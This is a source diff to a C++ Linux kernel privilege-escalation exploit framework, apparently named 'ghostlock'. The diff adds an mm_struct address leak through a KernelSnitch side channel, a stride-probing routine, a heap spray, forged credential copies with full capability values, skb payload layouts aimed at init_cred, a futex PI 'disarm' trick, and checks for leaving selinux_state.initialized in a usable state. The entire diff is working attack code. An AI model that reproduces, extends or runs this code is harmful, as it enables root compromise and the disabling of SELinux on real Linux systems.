@@ -8,6 +8,7 @@
 #include "support/native_resource.hpp"
 #include "kernel/target.h"
 #include "kernelsnitch/kernelsnitch.h"
+#include "kernelsnitch/stride_verify.h"
 
 /* Session aliases kept from the preprocessor era: the attack statements were
  * written with these short names, and references preserve every call site
@@ -263,6 +264,27 @@ namespace ghostlock::support {
         return syscall(SYS_futex, uaddr, op, val, timeout_or_value, uaddr2, val3);
     }
 
+    long ghost_disarm(const char *why, int32_t *err_out) {
+        /* "Owned by tid == getpid(), waiters": forces the blocking PI path, the
+         * only one that rewrites task->pi_blocked_on. */
+        uint32_t dummy_word = 0x80000000U | static_cast<uint32_t>(getpid());
+        struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
+        errno = 0;
+        long ret = futex_op(&dummy_word, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
+        const int32_t saved = errno;
+        if (err_out) *err_out = saved;
+        if (ret == 0) {
+            /* Took the lock instead of blocking: nothing was cleared. Release
+             * it so a later call is not blocked by this one. */
+            (void) futex_op(&dummy_word, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+            pr_warning("ghost disarm (%s) took the fast path; pi_blocked_on NOT cleared\n", why);
+        } else if (saved != ETIMEDOUT) {
+            pr_warning("ghost disarm (%s) ret=%ld errno=%d; not the timeout path\n",
+                       why, ret, saved);
+        }
+        return ret;
+    }
+
     long sched_setattr_tid(int32_t tid, int32_t nice_value) {
         kernel::local_sched_attr attr;
         memset(&attr, 0, sizeof(attr));
@@ -294,16 +316,32 @@ namespace ghostlock::support {
 
     static int32_t fill_profile_cred_copy(unsigned char *p, size_t off) {
         const profile::kernel_offsets *v = profile_values();
-        if (!v || !v->credential.copy_size || v->credential.copy_size > kernel::ORDER3_SIZE ||
-            v->credential.usage_offset + sizeof(uint32_t) > v->credential.copy_size ||
+        if (!v || !v->credential.copy_size || v->credential.copy_size > kernel::ORDER3_SIZE) {
+            pr_error("credential copy profile is incomplete\n");
+            return 0;
+        }
+        /* Stage 3: a per-image usage width / security offset is authoritative
+         * when present; otherwise the compiled 4-byte usage remains. */
+        const uint32_t usage_size = v->credential.usage_size.value_or(sizeof(uint32_t));
+        const bool security_out_of_range =
+                v->credential.security_offset &&
+                *v->credential.security_offset + sizeof(uint64_t) >
+                        v->credential.copy_size;
+        if ((usage_size != 4 && usage_size != 8) ||
+            v->credential.usage_offset + usage_size > v->credential.copy_size ||
+            security_out_of_range ||
             v->credential.caps_offset + v->credential.caps_count * sizeof(uint64_t) >
-            v->credential.copy_size) {
+                    v->credential.copy_size) {
             pr_error("credential copy profile is incomplete\n");
             return 0;
         }
         unsigned char *c = p + off;
         memset(c, 0, v->credential.copy_size);
-        put32(c, v->credential.usage_offset, v->credential.usage_value);
+        if (usage_size >= sizeof(uint64_t)) {
+            put64(c, v->credential.usage_offset, v->credential.usage_value);
+        } else {
+            put32(c, v->credential.usage_offset, v->credential.usage_value);
+        }
         for (uint32_t i = 0; i < v->credential.caps_count; i++) {
             put64(c, v->credential.caps_offset + i * sizeof(uint64_t), v->credential.caps_value);
         }
@@ -435,6 +473,39 @@ namespace ghostlock::support {
         post_ctx.memfds.assign(mm_objs_per_slab, 0);
     }
 
+    /* Page-free Stage 1/3: W1's value source. A profile that states
+     * `w1_scratch.image` writes the scratch alias through the same +0x100
+     * construction the page value used, so W1's write is identical apart from
+     * where its value comes from. Returns 0 when a stated scratch has no
+     * direct-map alias: the caller must refuse rather than fall back to a page
+     * the profile said not to use. `*out` stays 0 when the request is not W1's
+     * shape or the profile states no scratch (the page path). */
+    static int32_t w1_scratch_value(const memory::WriteRequest &request,
+                                    uintptr_t *out) {
+        *out = 0;
+        if (request.mode != memory::WriteMode::Zero || !request.preserve_child) return 1;
+        const std::optional<uint64_t> scratch_image =
+                session::g_exploit_session.profile.w1_scratch_image();
+        if (!scratch_image.has_value()) return 1;
+        const uintptr_t scratch_va =
+                kernel::KIMAGE_TEXT_BASE + static_cast<uintptr_t>(*scratch_image);
+        const uintptr_t scratch_alias =
+                session::g_exploit_session.addresses.data_alias(scratch_va);
+        if (scratch_alias == 0) {
+            pr_error("W1 scratch +0x%llx has no direct-map alias; refusing "
+                     "the page value (absent would keep the page path)\n",
+                     static_cast<unsigned long long>(*scratch_image));
+            return 0;
+        }
+        *out = scratch_alias + 0x100;
+        pr_info("w1_value_source=scratch image=+0x%llx alias=0x%llx "
+                "value=0x%llx\n",
+                static_cast<unsigned long long>(*scratch_image),
+                static_cast<unsigned long long>(scratch_alias),
+                static_cast<unsigned long long>(*out));
+        return 1;
+    }
+
     int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
         memset(skb_buf(), 0, kernel::SKB_SEND_SIZE);
 
@@ -453,10 +524,22 @@ namespace ghostlock::support {
         uintptr_t default_fops = payload_base + kernel::FOPS_TABLE_OFF;
         uintptr_t credential_fops =
                 payload_base + (tcp_layout ? kernel::TCP_CRED_COPY_OFF : kernel::CRED_COPY_OFF);
+        /* Page-free Stage 1: W1's value source. A profile that states
+         * `w1_scratch.image` writes the scratch alias through the same +0x100
+         * construction as the page value; everything else on this page stays as
+         * it was (the page is still prepared at this stage). */
+        uintptr_t zero_value_override = 0;
+        if (request && !w1_scratch_value(*request, &zero_value_override)) return 0;
+        if (zero_value_override == 0 && request &&
+            request->mode == memory::WriteMode::Zero && request->preserve_child) {
+            pr_info("w1_value_source=page page=0x%zx value=0x%zx\n", base,
+                    static_cast<size_t>(base + 0x100));
+        }
         memory::PayloadWriteLayout write_layout = payload_write_layout(
             request, base, default_fops, credential_fops,
             session::g_exploit_session.addresses.
-            data_alias(session::g_exploit_session.addresses.init_cred_image_addr()));
+            data_alias(session::g_exploit_session.addresses.init_cred_image_addr()),
+            zero_value_override);
         (session::g_exploit_session.heap.current.fake_parent) = write_layout.parent;
         (session::g_exploit_session.heap.current.fake_right) = write_layout.right;
         (session::g_exploit_session.heap.current.fake_left) = write_layout.left;
@@ -656,7 +739,7 @@ namespace ghostlock::support {
      * syscall-level fault-injection framework; the ownership refactor itself is
      * complete (CPP12h). Completion: add the framework, cover the early-exit
      * paths, then delete this comment and the residual row. */
-    uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
+    uintptr_t prepare_kernel_page(const memory::WriteRequest *request, bool leak_only) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
         /* Release every userspace reference from the preceding write before the
@@ -664,8 +747,20 @@ namespace ghostlock::support {
          * leaked one mm_struct per stage and progressively poisoned later sprays. */
         close_reclaim_sockets();
         cleanup_page_prepare_state();
-        mm_objs_per_slab = kernel::ORDER3_SIZE /
-                           session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
+        /* The profile's measured stride sizes the spray. A value outside the
+         * sane range is treated as absent and the compiled default applies;
+         * the leak itself stays stride-agnostic. */
+        uint32_t spray_stride = kernel::MM_STRUCT_SZ;
+        const profile::kernel_offsets *stride_values = profile_values();
+        if (stride_values && stride_values->misc.mm_struct_sz) {
+            const uint32_t candidate = *stride_values->misc.mm_struct_sz;
+            if (candidate >= 64 && candidate <= kernel::ORDER3_SIZE) {
+                spray_stride = candidate;
+            }
+        }
+        mm_objs_per_slab = kernel::ORDER3_SIZE / spray_stride;
+        pr_info("[spray] mm_struct stride=%u objects_per_slab=%zu\n",
+                spray_stride, mm_objs_per_slab);
         prepare_ctxs();
 
         session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
@@ -682,9 +777,13 @@ namespace ghostlock::support {
         }
 
         int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
+        /* The leak scans a stride-agnostic grid (32 primary, 8 last resort;
+         * 4 KiB outer). The measured stride sizes the spray only, so an
+         * imprecise value shapes the heap slightly differently but cannot
+         * hide the mm from the leak. */
         kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
-            session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ),
-            kernel::MM_ORDER, static_cast<size_t>(cpu_count), ghostlock::profile::kernelsnitch_collisions(), 0,
+            kernelsnitch::SCAN_PRIMARY_INNER, 0, static_cast<size_t>(cpu_count),
+            ghostlock::profile::kernelsnitch_collisions(), 0,
             static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
         /* The forked leak child borrows the shared mmap context through this
          * compatibility alias; the owner remains the only releaser. */
@@ -801,6 +900,22 @@ namespace ghostlock::support {
         }
 
         uintptr_t base = leaked & ~(kernel::ORDER3_SIZE - 1);
+        if (leak_only) {
+            /* Probe round: the mm_struct leak is the whole result. Tear the
+             * spray down exactly as the payload path does at its tail, minus
+             * the page write and the reclaim sockets, then hand the base back;
+             * the caller reads the offset from last_mm_struct. */
+            pr_info("[stride] mm_struct leaked=0x%zx +%lldms\n",
+                    leaked, ms_since(&t_spray));
+            snitch.reset();
+            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
+                SYSCHK(close(prepare_ctx.memfds[i]));
+                prepare_ctx.memfds[i] = -1;
+                kill_child(prepare_ctx.childs[i]);
+            }
+            cleanup_page_prepare_state();
+            return base;
+        }
         if (!prepare_skb_payload(base, request)) {
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
@@ -882,6 +997,53 @@ namespace ghostlock::support {
         return base;
     }
 
+    bool page_free_run(void) {
+        return route::page_free(session::g_exploit_session.profile);
+    }
+
+    const char *page_free_reason(void) {
+        return route::page_free_reason(session::g_exploit_session.profile);
+    }
+
+    /* Page-free Stage 3: install the write layout the page path derives, with
+     * no page behind it. Every page-derived verdict field is zeroed first, so a
+     * route that still reads one would fault instead of silently using a stale
+     * page; the routes skip their page guards in this mode instead. The layout
+     * itself is request-derived and needs no page: W1/W1p carry the scratch
+     * alias, W2 carries init_cred, and leaf writes carry target - 8. */
+    int32_t prepare_page_free_context(const memory::WriteRequest &request) {
+        auto &page = session::g_exploit_session.heap.current;
+        page.base = 0;
+        page.last_mm_struct = 0;
+        page.fake_lock = 0;
+        page.fake_w0 = 0;
+        page.fake_task = 0;
+        page.fake_fops = 0;
+
+        uintptr_t zero_value_override = 0;
+        if (!w1_scratch_value(request, &zero_value_override)) return 0;
+        if (request.mode == memory::WriteMode::Zero && request.preserve_child &&
+            zero_value_override == 0) {
+            /* A value-carrying write with no value source: page-free cannot
+             * produce it, and the page is gone by contract. */
+            pr_error("page-free write has no value source (zero/preserve_child "
+                     "without w1_scratch.image)\n");
+            return 0;
+        }
+        const memory::PayloadWriteLayout write_layout = memory::payload_write_layout(
+            &request, /*page_base=*/0, /*default_fops=*/0, /*credential_fops=*/0,
+            session::g_exploit_session.addresses.data_alias(
+                session::g_exploit_session.addresses.init_cred_image_addr()),
+            zero_value_override);
+        page.fake_parent = write_layout.parent;
+        page.fake_right = write_layout.right;
+        page.fake_left = write_layout.left;
+        pr_info("page-free write target=0x%016zx preserve_child=%d value=0x%016zx\n",
+                static_cast<size_t>(request.target), request.preserve_child,
+                static_cast<size_t>(write_layout.right));
+        return 1;
+    }
+
     uintptr_t prepare_good_kernel_page(const memory::WriteRequest &request) {
         uint32_t max_attempts = session::g_exploit_session.profile.heap_prepare_max_attempts();
         struct timespec t_good;
@@ -904,12 +1066,15 @@ namespace ghostlock::support {
                     .left = (session::g_exploit_session.heap.current.fake_left),
                     .fops = (session::g_exploit_session.heap.current.fake_fops),
                 };
+                const uint32_t init_off =
+                        session::g_exploit_session.profile.selinux_initialized_offset();
                 if (!payload_write_layout_matches_request(&request, &layout)) {
                     pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
                                request.preserve_child, layout.right);
-                } else if (!payload_write_layout_accepts_page(&request, &layout)) {
-                    pr_warning("page %016zx stores an even byte over "
-                               "selinux_state.initialized; taking another\n", base);
+                } else if (!payload_write_layout_accepts_page(&request, &layout, init_off)) {
+                    pr_warning("W1 value %016zx leaves selinux_state.initialized "
+                               "(byte %u) even; taking another page\n",
+                               layout.right, init_off);
                 } else {
                     pr_info("prepare_kernel_page ok attempt=%u +%lldms\n", attempt,
                             ms_since(&t_good));
@@ -927,5 +1092,42 @@ namespace ghostlock::support {
                        max_attempts, ms_since(&t_good));
         }
         return 0;
+    }
+
+    bool probe_mm_stride(std::size_t sizeof_mm, std::size_t max_rounds) {
+        kernelsnitch::StrideVerifier verifier(sizeof_mm);
+        const std::size_t max_attempts = max_rounds * 2;
+        std::size_t attempts = 0;
+        while (verifier.rounds() < max_rounds && !verifier.decided() &&
+               attempts < max_attempts) {
+            attempts++;
+            const uintptr_t base = prepare_kernel_page(nullptr, true);
+            if (base == 0) {
+                pr_warning("[stride] leak round failed (attempt %zu/%zu)\n",
+                           attempts, max_attempts);
+                continue;
+            }
+            const uintptr_t leaked =
+                    session::g_exploit_session.heap.current.last_mm_struct;
+            const auto offset = static_cast<std::size_t>(
+                leaked & (kernel::ORDER3_SIZE - 1));
+            verifier.add_offset(offset);
+            pr_info("[stride] round=%zu offset=0x%zx\n",
+                    verifier.rounds(), offset);
+        }
+        pr_info("[stride] summary rounds=%zu samples=%zu gcd=0x%zx "
+                "candidates=%zu decided=%d attempts=%zu\n",
+                verifier.rounds(), verifier.samples(), verifier.gcd(),
+                verifier.voted_count(), verifier.decided() ? 1 : 0, attempts);
+        for (std::size_t i = 0; i < verifier.voted_count(); i++) {
+            const kernelsnitch::StrideCandidateVote candidate = verifier.voted(i);
+            pr_info("[stride] candidate value=%zu votes=%zu/%zu objects=%zu\n",
+                    candidate.value, candidate.votes, verifier.samples(),
+                    kernel::ORDER3_SIZE / candidate.value);
+        }
+        if (!verifier.any_votes()) {
+            pr_warning("[stride] no candidate: no round produced a vote\n");
+        }
+        return verifier.decided();
     }
 } // namespace ghostlock::support
